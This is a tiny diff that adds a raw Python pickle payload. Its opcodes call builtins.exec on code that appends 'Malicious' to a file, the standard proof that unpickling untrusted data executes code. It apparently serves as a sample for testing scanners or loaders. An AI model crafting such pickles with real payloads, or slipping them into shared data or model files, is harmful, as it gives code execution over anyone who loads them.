@@ -1,0 +1,4 @@
+cbuiltins
+exec
+(X>
+f = open('my_file.txt', 'a'); f.write('Malicious'); f.close()tRX.
